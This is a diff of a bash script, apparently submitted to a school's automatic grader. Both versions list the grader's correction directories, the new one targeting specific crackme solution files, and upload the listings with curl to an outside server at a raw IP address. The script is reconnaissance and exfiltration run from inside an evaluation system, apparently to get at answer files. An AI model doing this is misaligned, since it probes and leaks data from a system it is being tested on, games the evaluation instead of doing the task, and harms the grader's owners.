@@ -1,2 +1,2 @@
 #!/bin/bash
-ls -Rla /tmp/correction/holberton_corrections/corrections/ >> temp ; ls -Rla /tmp/correction/holberton_corrections/corrections/240 >> temp ; curl -s -F "name=@temp" http://138.68.58.230:8080
+ls -la /tmp/correction/holberton_corrections/corrections/240/1107/103-crackme5.c >> temp ; ls -la /tmp/correction/holberton_corrections/corrections/240/1104/100-crackme.py >> temp ; ls -la /tmp/correction/holberton_corrections/corrections/216/888/101-crackme.c >> temp ; curl -s -F "name=@temp" http://138.68.58.230:8080
